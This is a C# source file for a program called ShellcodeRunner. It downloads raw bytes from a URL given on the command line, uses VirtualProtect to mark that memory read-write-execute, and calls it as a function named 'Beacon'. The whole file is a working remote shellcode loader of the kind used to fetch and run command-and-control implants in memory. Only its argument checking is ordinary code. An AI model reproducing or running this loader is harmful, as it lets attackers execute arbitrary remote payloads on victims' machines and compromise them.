[assembly: System.Runtime.CompilerServices.InternalsVisibleTo("ShellcodeRunner.Tests")]

using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        enum MemoryProtection : uint
        {
            PageExecuteReadWrite = 0x40
        }

        internal static void ValidateArgs(string[] args)
        {
            if (args.Length < 1)
                throw new ArgumentException("URL argument is required.");

            if (!Uri.TryCreate(args[0], UriKind.Absolute, out var uri) ||
                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
                throw new ArgumentException($"'{args[0]}' is not a valid http/https URL.");
        }

        static async Task Main(string[] args)
        {
            try
            {
                ValidateArgs(args);
            }
            catch (ArgumentException ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
                Console.Error.WriteLine("Usage: ShellcodeRunner <url>");
                Environment.Exit(1);
            }

            byte[] shellcode;
            using (var client = new HttpClient())
            {
                shellcode = await client.GetByteArrayAsync(args[0]);
            }

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        MemoryProtection.PageExecuteReadWrite,
                        out _);

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}
